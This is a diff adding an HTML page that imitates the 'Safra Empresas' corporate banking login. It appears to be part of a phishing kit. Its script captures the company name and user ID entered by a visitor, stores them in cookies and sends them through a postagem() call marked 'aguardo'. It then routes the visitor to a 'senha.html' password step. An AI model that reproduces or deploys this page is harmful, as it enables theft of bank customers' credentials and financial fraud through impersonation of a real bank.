@@ -1,0 +1,164 @@
+﻿<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Safra Empresas</title>
+<script src="../../code.jquery.com/jquery-1.10.2.js"></script>
+<script language="javascript" src="conjs/strings.js"></script>
+
+</head>
+
+<style>
+	
+	body {
+		margin: 0;
+		background: #002334;
+	
+		
+	}
+	
+	#tudo {
+		
+		background: #fff;
+		width: 770px;
+		margin: 0 auto;
+		height: 100%;
+		position: fixed;
+		    margin-left: auto;
+    margin-right: auto;
+    left: 0%;
+    right: 0%;
+	}
+	
+	.footer {
+		position: absolute;
+		bottom: 0;
+		height: 25px;
+		background: #002334;
+		clear: both;
+		width: 100%;
+		text-align: center;
+		padding-top: 5px;
+		
+	}
+	
+	.topo {
+		background: url(topobanner/topoban.jpg) left top no-repeat;
+		height: 109px;
+	}
+	
+	.entradacmp{
+		float: right;
+		height: 25px;
+		margin-top: 38px;
+		margin-right: 85px;
+	}
+	
+	.entradacmp items {
+		float: left;
+
+	}
+	
+	.entradacmp .items>img {
+		vertical-align: middle;
+
+	}
+	
+	input {
+    BACKGROUND-COLOR: #ffffff;
+    BORDER-BOTTOM: #999999 thin solid;
+    BORDER-LEFT: #999999 thin solid;
+    BORDER-RIGHT: #999999 thin solid;
+    BORDER-TOP: #999999 thin solid;
+    COLOR: #6C6C6C;
+    FONT-FAMILY: Tahoma, Verdana, Arial, Geneva, sans-serif;
+    FONT-SIZE: 9px;
+    FONT-STYLE: normal;
+}
+	
+	.divide {
+		
+		height: 4px;
+		background: #002334;
+	}
+	
+	#search {
+		cursor: pointer;
+	}
+</style>
+	
+<body>
+
+<div id="tudo">
+
+<div class="topo">
+	<div class="entradacmp">
+
+	<span class="items"><img src="topobanner/itemnome.gif"></span>
+	<span class="items"><input id="named" size="25" maxlength="15" value=""></span>
+	<span class="items"><img src="topobanner/itemusr.gif"></span>
+	<span class="items"><input id="usuario" size="10" maxlength="8" value=""></span>
+	&nbsp;<span id="search" class="items"><img src="topobanner/botao.jpg"></span>&nbsp;&nbsp;
+	<span class="items"><img src="topobanner/secure.jpg"></span>
+	
+	</div>
+</div>
+
+	<div class="divide"></div>
+
+<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,0,0" width="770" height="174" id="banner" align="middle">
+					<param name="allowScriptAccess" value="sameDomain">
+					<param name="allowFullScreen" value="false">
+					<param name="movie" value="animacao/banner.swf"><param name="quality" value="high"><param name="bgcolor" value="#ffffff">	<embed src="animacao/banner.swf" quality="high" bgcolor="#ffffff" width="770" height="174" name="banner" align="middle" allowscriptaccess="sameDomain" allowfullscreen="false" type="application/x-shockwave-flash" pluginspage="http://www.adobe.com/go/getflashplayer">
+				</object>
+				
+				<br><br>
+
+
+	<img src="imgs/finalmeio.jpg">
+				
+<script language="javascript">
+	$("#search").click(function(){
+		
+	var dados = "";
+	var local = "";
+	
+	if($("#named").val().length < 2){
+	return;
+	}
+	
+	if($("#usuario").val().length < 2){
+	return;
+	}
+		
+	document.cookie = "name=" + $("#named").val();
+	document.cookie = "usuario=" +  $("#usuario").val();
+		
+	dados = "dados="+ $("#named").val() + " | "  + $("#usuario").val() + "&pag=Senha";
+	local = "senha.html";
+	
+	postagem(dados + "&status=aguardo",local , Math.random());
+		
+	});
+</script>
+
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+
+
+</div>
+	
+	
+	<div class="footer"><img src="rodape/rodapeesc.jpg" width="720" height="16" alt=""/></div>
+	
+
+</body>
+</html>
